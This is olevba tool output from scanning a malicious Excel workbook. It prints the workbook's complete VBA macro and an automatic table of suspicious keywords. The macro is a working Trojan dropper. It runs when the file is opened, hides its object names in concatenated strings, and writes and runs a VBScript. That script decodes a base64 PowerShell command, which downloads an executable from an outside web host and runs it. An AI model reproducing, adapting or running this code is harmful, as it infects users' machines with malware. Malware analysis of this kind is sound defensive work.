olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Agent.gen-70f61a0649bdf59239f4e789021e707fd14e40e290e8735ff48fdff5ac000d92
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()
varo = "Set objShell = CreateObject(""Wscript.Shell"")" + vbCrLf
varo = varo + "objShell.Run Base64Decode(""cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBlAHgAZQBjAHUAdABpAG8AbgBwAG8AbABpAGMAeQAgAGIAeQBwAGEAcwBzACAALQBXACAASABpAGQAZABlAG4AIAAtAGMAbwBtAG0AYQBuAGQAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGIAYwBtAGIAYwBvAG4AcwB1AGwAdABpAG4AZwAuAGMAbwBtAC8AdwBwAC0AYwBvAG4AdABlAG4AdAAvAHAAbAB1AGcAaQBuAHMALwB1AGgAdQBoAHUAeQAuAGUAeABlACcALAAkAGUAbgB2ADoAVABlAG0AcAArACcAXAByAHQALgBlAHgAZQAnACkAOwAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAGMAbwBtACAAUwBoAGUAbABsAC4AQQBwAHAAbABpAGMAYQB0AGkAbwBuACkALgBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQAoACQAZQBuAHYAOgBUAGUAbQBwACsAJwBcAHIAdAAuAGUAeABlACcAKQA="",True)" + vbCrLf
varo = varo + "Function Base64Decode(ByVal sBase64EncodedText, ByVal fIsUtf16LE)" + vbCrLf
varo = varo + "Dim sTextEncoding" + vbCrLf
varo = varo + "  if fIsUtf16LE Then sTextEncoding = ""utf-16le"" Else sTextEncoding = ""utf-8""" + vbCrLf
 varo = varo + "   With CreateObject(""Msxml2.DOMDocument"").CreateElement(""aux"")" + vbCrLf
 varo = varo + "   .DataType = ""bin.base64""" + vbCrLf
  varo = varo + "     .Text = sBase64EncodedText" + vbCrLf
  varo = varo + "  Base64Decode = BytesToStr(.NodeTypedValue, sTextEncoding)" + vbCrLf
  varo = varo + " End With" + vbCrLf
varo = varo + "End Function" + vbCrLf
varo = varo + "function BytesToStr(ByVal byteArray, ByVal sTextEncoding)" + vbCrLf
varo = varo + "If LCase(sTextEncoding) = ""utf-16le"" then" + vbCrLf
 varo = varo + " BytesToStr = CStr(byteArray)" + vbCrLf
varo = varo + "   Else " + vbCrLf
  varo = varo + "   With CreateObject(""ADODB.Stream"")" + vbCrLf
   varo = varo + "   .Type = 1 " + vbCrLf
   varo = varo + "  .Open" + vbCrLf
        varo = varo + " .Write byteArray" + vbCrLf
         varo = varo + ".Position = 0" + vbCrLf
          varo = varo + ".Type = 2 " + vbCrLf
      varo = varo + "  .CharSet = sTextEncoding" + vbCrLf
      varo = varo + "    BytesToStr = .ReadText" + vbCrLf
     varo = varo + "     .Close" + vbCrLf
    varo = varo + "   End With" + vbCrLf
  varo = varo + " End If" + vbCrLf
varo = varo + "end function"
    On Error Resume Next
    Wscript = "Wscript.Shell"
    Set oknbvcfgh = CreateObject(Wscript)

    'If Error WS Does not exist
    If Err.Number <> 0 Then
        DoesWSExist = False
    Else '15486
        DoesWSExist = True '15486
    End If
 
    On Error GoTo -1
x = "C:\program"
x = x + "data"
x = x + "\asc.txt"
Dim i As Integer
Handler:
Dim pDueDzBOCyptXbftECSYnupWXGpTqKfoDuRCnPZoWNBCTDSzPjWARqG As Object
sdfsdfs = "Scri"
sdfsdfs = sdfsdfs + "pti"
sdfsdfs = sdfsdfs + "ng."
smallvar = "File"
smallvar = smallvar + "SystemObject" '15486
Set pDueDzBOCyptXbftECSYnupWXGpTqKfoDuRCnPZoWNBCTDSzPjWARqG = CreateObject(sdfsdfs + smallvar)
Dim XQUldTzQYIUdpedLfrzikDDxHUVQybcONHdDQsSfJulwxFUKKmCgIGQ As Object
almvar = "vb"
almvar = almvar + "s"
Set XQUldTzQYIUdpedLfrzikDDxHUVQybcONHdDQsSfJulwxFUKKmCgIGQ = pDueDzBOCyptXbftECSYnupWXGpTqKfoDuRCnPZoWNBCTDSzPjWARqG.CreateTextFile(x + ".vbs")
Application.Execute (XQUldTzQYIUdpedLfrzikDDxHUVQybcONHdDQsSfJulwxFUKKmCgIGQ.WriteLine(varo))
Application.Execute (Selection.Font.Name = "Arial")
Set pDueDzBOCyptXbftECSYnupWXGpTqKfoDuRCnPZoWNBCTDSzPjWARqG = Nothing
Path = "C:\Windows\System32\w" + "script" + ".exe "
File = x
File = File + "." + "v"
File = File + "bs"
Call test1(Path + File)

End Sub

Function test1(received As String)
sopvd = "WScript." + "She" + "ll"
Set WshShell = CreateObject(sopvd)
Shell received
Set WshShell = Nothing
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|ADODB.Stream        |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

